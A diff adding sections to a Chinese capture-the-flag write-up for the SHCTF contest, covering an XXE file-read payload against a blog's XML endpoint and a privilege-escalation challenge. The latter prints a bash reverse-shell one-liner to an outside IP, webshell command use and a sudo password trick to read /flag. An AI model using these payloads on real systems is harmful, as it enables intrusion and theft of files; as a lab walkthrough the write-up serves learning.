@@ -2,6 +2,8 @@
 title: SHCTF第三届山河杯
 date: 2026-03-21 10:15:23
 tags:
+index_img: https://i0.hdslb.com/bfs/article/d7ce87863e45fd9d9328e696a9635429e213dbf8.jpg@1256w_708h_!web-article-pic.avif
+categories: CTF
 ---
 
 ## [阶段1] Ezphp
@@ -269,3 +271,56 @@ ai一把锁
    - **关键点**：一旦线程1提交，线程2继续执行。线程2的 `F('money')` 是基于**当前数据库值**计算的。
    - 线程1提交后，库中是 0。线程2执行 `0 - 10 = -10`。
    - **结果**：余额变成了 **-10**。
+
+## [阶段2] Mini Blog
+
+一个博客系统，发布的时候抓包发现有xml，尝试用外部实体读文件
+
+```xml-dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE post [<!ENTITY suny SYSTEM "file:///flag" >]>
+<post><title>
+&suny;
+</title><content>222</content></post>
+```
+
+![image-20260326091455221](https://gitee.com/bobrocket/img/raw/master/image-20260326091455221.png)
+
+## [阶段3] sudoooo0
+
+题目说有shell，那就先扫一下目录，用dirsearch扫不出来，用yakit扫可以发现有一个webshell.php
+
+猜测传参cmd，还真是，根目录下有flag，但是cat读不到
+
+```
+ls -la /
+```
+
+发现需要root权限，先连个反弹shell
+
+```
+bash -c 'bash >& /dev/tcp/183.66.27.22/18546 0>&1'
+```
+
+注意url编码
+
+根据题目名称，应该是要sudo提权
+
+```
+ps -ef
+```
+
+查看当前进程
+
+![image-20260326085935726](https://gitee.com/bobrocket/img/raw/master/image-20260326085935726.png)
+
+用ai解释一下这条命令
+
+![image-20260326090153209](https://gitee.com/bobrocket/img/raw/master/image-20260326090153209.png)
+
+那么我们下面仿照这个命令读flag即可
+
+```
+script -q -c 'echo zswPohrO| sudo -S cat /flag' /dev/null  
+```
+
